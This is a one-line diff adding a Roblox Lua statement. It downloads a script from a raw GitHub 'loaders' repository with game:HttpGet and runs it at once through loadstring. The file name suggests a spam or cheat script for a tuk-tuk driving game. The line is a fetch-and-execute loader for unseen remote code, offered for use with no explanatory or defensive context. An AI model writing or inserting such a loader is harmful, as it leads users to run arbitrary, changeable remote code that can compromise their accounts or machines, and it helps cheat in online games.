@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/drive-a-tuk-tuk-spam5-5y21h5ihkx80p3.lua"))()
